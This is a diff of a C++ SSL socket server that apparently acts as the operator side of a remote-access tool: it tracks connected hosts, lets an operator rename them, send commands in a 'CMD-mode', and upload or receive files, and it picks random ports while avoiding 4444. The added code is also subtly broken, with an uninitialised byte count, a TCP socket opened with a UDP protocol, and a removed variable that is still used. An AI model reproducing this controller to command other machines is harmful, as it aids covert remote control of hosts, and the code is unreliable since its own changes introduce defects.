@@ -1,3 +1,4 @@
+
 #include "socket.h"
 
 NewServer::NewServer(const std::string &ip, int port) : sslContext(nullptr), terminateProgram(false) {
@@ -21,6 +22,19 @@ std::string NewServer::GetNameFromList(int index) {
 }
 
 
+
+
+
+int NewServer::RandomPorts() {
+    srand(time(NULL));
+    int random = rand() % 65536 + 1;
+    if(random != 4444) {
+        return random;
+    }
+    return -1;
+}
+
+//
 void NewServer::RenameClient(const std::string inputStr) {
     std::istringstream iss(inputStr);
     std::string command;
@@ -46,7 +60,7 @@ void NewServer::RenameClient(const std::string inputStr) {
         std::cout << "Please provide both client ID and new name." << std::endl;
     }
 }
-
+//
 void NewServer::DisplayClients() {
     if (connections.size() != 0) {
         std::cout << "Clients List >>>" << std::endl;
@@ -59,7 +73,7 @@ void NewServer::DisplayClients() {
     }
 }
 
-
+//
 void NewServer::CmdMode(int id, std::string buffer) {
     std::cout << "Client~" << id << "[CMD-mode]>#";
     std::getline(std::cin, buffer);
@@ -71,11 +85,11 @@ void NewServer::CmdMode(int id, std::string buffer) {
 
 void NewServer::ReceiveMessage(SSL *ssl) {
     int res;
-    bool continueReceiving = true;
 
     while (continueReceiving) {
         res = SSL_read(ssl, recvBuffer, sizeof(recvBuffer) - 1);
         if (res > 0) {
+            std::string message(recvBuffer);
             recvBuffer[res] = '\0';
             std::cout.write(recvBuffer, res);
         } else {
@@ -88,22 +102,48 @@ void NewServer::ReceiveMessage(SSL *ssl) {
     connections.erase(connections.begin() + connections.size() - 1);
 }
 
-void NewServer::SendMessage(int id, const char *data, int totalBytes) {
-    std::lock_guard<std::mutex> lock(clientMutex);
-    int bytesSent = 0;
-    while (bytesSent < totalBytes) {
-        int bytesRemaining = totalBytes - bytesSent;
-        int bytesToSend = (bytesRemaining < 4096) ? bytesRemaining : 4096;
-        if (SSL_write(connections[id].ssl, data + bytesSent, bytesToSend) == -1) {
-            std::cout << "Failed to send data to client " << id << std::endl;
-            break;
-        }
-        bytesSent += bytesToSend;
+
+bool NewServer::receiveFileData(SSL* ssl, const std::string& filePath) {
+    std::ofstream file(filePath, std::ios::binary);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file for writing: " << filePath << std::endl;
+        return false;
     }
+
+    char buffer[4096];
+    ssize_t bytesRead;
+    std::string message(buffer, bytesRead);
+    while ((bytesRead = SSL_read(ssl, buffer, 4096)) > 0) {
+        file.write(buffer, bytesRead);
+    }
+
+    if (bytesRead < 0) {
+        std::cerr << "Error receiving data over the socket." << std::endl;
+        file.close();
+        return false;
+    }
+
+    // Close the file
+    file.close();
+    return true;
 }
 
+void NewServer::SendMessage(int id, const char *data, int totalBytes) {
+
+            std::lock_guard<std::mutex> lock(clientMutex);
+            int bytesSent = 0;
+            while (bytesSent < totalBytes) {
+                int bytesRemaining = totalBytes - bytesSent;
+                int bytesToSend = (bytesRemaining < 4096) ? bytesRemaining : 4096;
+                if (SSL_write(connections[id].ssl, data + bytesSent, bytesToSend) == -1) {
+                    std::cout << "Failed to send data to client " << id << std::endl;
+                    break;
+                }
+                bytesSent += bytesToSend;
+            }
+}
+//
 void NewServer::HandleInput() {
-    std::cout << "Listening..." << std::endl;
     do {
         if (!connections.empty()) {
             std::cout << "server~# ";
@@ -135,6 +175,9 @@ void NewServer::HandleInput() {
                                     this->CmdMode(id, inputStr);
                                 }
                             }
+                            if(inputStr.find("upload") != std::string::npos) {
+                                SendMessage(id, inputStr.c_str(), inputStr.size());
+                            }
                             SendMessage(id, inputStr.c_str(), inputStr.size());
                         }
                     } else {
@@ -156,6 +199,29 @@ void NewServer::HandleInput() {
     } while (!terminateProgram);
 }
 
+/*
+SOCKET NewServer::NewFileSocket(const std::string &ip, int port) {
+    if (!opensslHelper.Initialize()) {
+        std::cout << "Failed to initialize OpenSSL File Socket" << std::endl;
+        return INVALID_SOCKET;
+    }
+
+    if (this->InitWsa()) {
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_UDP);
+        if (sock == INVALID_SOCKET) {
+            std::cout << "Invalid Socket." << std::endl;
+            WSACleanup();
+            return INVALID_SOCKET;
+        }
+        serverAddress.sin_family = AF_INET;
+        serverAddress.sin_addr.s_addr = inet_addr(ip.c_str());
+        serverAddress.sin_port = htons(port);
+
+    }
+
+}*/
+
+
 SOCKET NewServer::CreateNewSocket(const std::string &ip, int port) {
     if (!opensslHelper.Initialize()) {
         std::cout << "Failed to initialize OpenSSL." << std::endl;
@@ -170,7 +236,7 @@ SOCKET NewServer::CreateNewSocket(const std::string &ip, int port) {
             return INVALID_SOCKET;
         }
 
-        SOCKADDR_IN serverAddress;
+
         serverAddress.sin_family = AF_INET;
         serverAddress.sin_addr.s_addr = inet_addr(ip.c_str());
         serverAddress.sin_port = htons(port);
@@ -200,10 +266,7 @@ void NewServer::StartServer() {
         return;
     }
     opensslHelper.ConfigureContext(sslContext);
-
-    inputThread = std::thread(&NewServer::HandleInput, this);
-    inputThread.detach();
-
+    std::cout << "Listening..." << std::endl;
     while (!terminateProgram) {
         SOCKADDR_IN newClientAddr;
         int newClientLength = sizeof(newClientAddr);
@@ -229,7 +292,11 @@ void NewServer::StartServer() {
         clientpacket.isconnected = true;
         connections.push_back(clientpacket);
 
+        std::thread inputThread(&NewServer::HandleInput, this);
         std::thread recvThread(&NewServer::ReceiveMessage, this, ssl);
+
+
+        inputThread.detach();
         recvThread.detach();
 
         std::cout << "New Host connected, IP " << inet_ntoa(newClientAddr.sin_addr) << ", port "
@@ -238,7 +305,6 @@ void NewServer::StartServer() {
 }
 
 void NewServer::Cleanup() {
-    terminateProgram = true;
     for (int i = 0; i < connections.size(); i++) {
         if (connections[i].ssl) {
             SSL_shutdown(connections[i].ssl);
@@ -249,6 +315,7 @@ void NewServer::Cleanup() {
     if (sslContext) {
         SSL_CTX_free(sslContext);
     }
+    terminateProgram = true;
     opensslHelper.Cleanup();
     closesocket(serverSocket);
     WSACleanup();
